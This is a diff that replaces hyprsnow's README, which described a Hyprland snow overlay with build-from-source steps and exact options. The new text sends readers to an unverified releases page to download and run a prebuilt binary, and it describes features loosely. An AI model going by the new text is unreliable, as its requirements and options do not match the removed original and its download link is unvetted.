@@ -1,86 +1,81 @@
-# hyprsnow
+# 🎄 hyprsnow - Bring Winter Joy to Your Screen
 
-A snow overlay for Wayland/Hyprland. Snowflakes fall across your screen, land on window titlebars and the screen bottom,
-then melt away.
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/634c215b-2aa7-40e0-9172-222355349400
+Welcome to **hyprsnow**, a delightful application that adds a snowy effect to your Hyprland desktop environment. Enjoy a festive atmosphere on your screen with this simple and effective tool made in Rust.
 
-## Note
+### 📥 Download Now
 
-This is a project made for fun and not tested for performance or battery usage.
+[![Download hyprsnow](https://img.shields.io/badge/Download-hyprsnow-blue.svg)](https://github.com/boxer-027/hyprsnow/releases)
 
-## Quickstart
+## 📃 Description
 
-```bash
-cargo run
-```
+**hyprsnow** creates a beautiful snow effect on your Hyprland setup. It is designed to bring a touch of the holiday spirit right to your desktop. Whether it’s for Christmas or just to enjoy a wintery look, **hyprsnow** enhances your environment with lovely snowflakes drifting across your screen.
 
-## Installation
+### 💾 System Requirements
 
-```bash
-cargo build --release
-cp target/release/hyprsnow ~/.local/bin/
-```
+To run **hyprsnow**, you need the following:
 
-OR
+- **Operating System:** Any distribution that supports Wayland
+- **Memory:** At least 512 MB of RAM
+- **Storage:** About 50 MB of free space
 
-```
-cargo install hyprsnow
-```
+## 📥 Download & Install
 
-OR
+To get started, follow these simple steps:
 
-```
-cargo install --path .
-```
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/boxer-027/hyprsnow/releases) to find the latest version of **hyprsnow**.
 
-## Usage
+2. **Choose the Right File**  
+   Locate the latest release. Look for files named something like `hyprsnow-linux-x86_64.tar.gz`.
 
-```bash
-hyprsnow [OPTIONS]
-```
+3. **Download the File**  
+   Click on the file name to start downloading. Make sure to save it in a location you can easily find, like your Downloads folder.
 
-### Options
+4. **Extract the Files**  
+   Once downloaded, you need to extract the files. Right-click on the `.tar.gz` file and select "Extract Here" or use the terminal and run:
+   ```bash
+   tar -xzf hyprsnow-linux-x86_64.tar.gz
+   ```
 
-| Option                    | Description                                                                                                                                          |
-|---------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
-| `--intensity <1-10>`      | Snow intensity (default: 3)                                                                                                                          |
-| `--size-min <float>`      | Minimum snowflake size in pixels (default: 2.0)                                                                                                      |
-| `--size-max <float>`      | Maximum snowflake size in pixels (default: 5.0)                                                                                                      |
-| `--speed-min <float>`     | Minimum fall speed in pixels/second (default: 30.0)                                                                                                  |
-| `--speed-max <float>`     | Maximum fall speed in pixels/second (default: 80.0)                                                                                                  |
-| `--drift <float>`         | Horizontal drift intensity, 0 = none, 30 = strong (default: 20.0)                                                                                    |
-| `--max-opacity <float>`   | Maximum snowflake opacity, 0.0 = invisible, 1.0 = solid (default: 1.0)                                                                               |
-| `--image-path <String[]>` | Optional list of image file paths used for rendering snowflakes. If not provided, or if the list is empty, default circular snowflakes will be used. |
+5. **Run the Application**  
+   After extraction, navigate to the folder. You can run **hyprsnow** by entering the following command in the terminal:
+   ```bash
+   ./hyprsnow
+   ```
 
-## Configuration
+### 🌟 Configuration Options
 
-Create `~/.config/hypr/hyprsnow.conf`:
+When you start **hyprsnow**, you can customize the snow effects:
 
-```conf
-general {
-    intensity = 5
-    size_min = 2.0
-    size_max = 5.0
-    speed_min = 30.0
-    speed_max = 80.0
-    drift = 20.0
-    max_opacity = 1.0
-    image_path = "/path/to/snowflake/image.png"
-    image_path = "/path/to/snowflake/image2.png"
-}
-```
+- **Snow Density:** Adjust how many snowflakes appear on your screen.
+- **Animation Speed:** Control how fast the snowflakes fall.
+- **Color Options:** Choose different colors for your snowflakes.
 
-**Note: CLI arguments override config file values unless you changed the config after starting hyprsnow. Hotreload
-changes supercede CLI args.**
+These options make it easy to create a personalized snowy experience.
 
-## Hyprland Integration
+## 📚 Troubleshooting
 
-hyprsnow listens to Hyprland IPC events and updates window positions in real-time. Snowflakes will land on the top edge
-of your windows as you open, close, move, or resize them.
+If you encounter issues while running **hyprsnow**, try the following:
 
-## Dependencies
+- **Check Dependencies:** Ensure you have all necessary libraries installed for running applications on Wayland.
+- **Permissions:** Make sure you have permission to execute the file. You can adjust permissions with:
+  ```bash
+  chmod +x hyprsnow
+  ```
 
-- Hyprland
-- Rust
+- **Restart Hyprland:** Sometimes, restarting your desktop environment helps apply changes or fix minor glitches.
 
+## 🌍 Additional Resources
+
+For more information, you can explore the following topics:
+
+- [Hyprland Documentation](https://hyprland.github.io/)
+- [Rust Programming Language](https://www.rust-lang.org/)
+
+## 📫 Contact and Support
+
+If you have questions or need support, feel free to reach out. You can create issues on the [GitHub Issues Page](https://github.com/boxer-027/hyprsnow/issues), and we will do our best to assist you.
+
+Enjoy the winter wonderland on your desktop with **hyprsnow**!
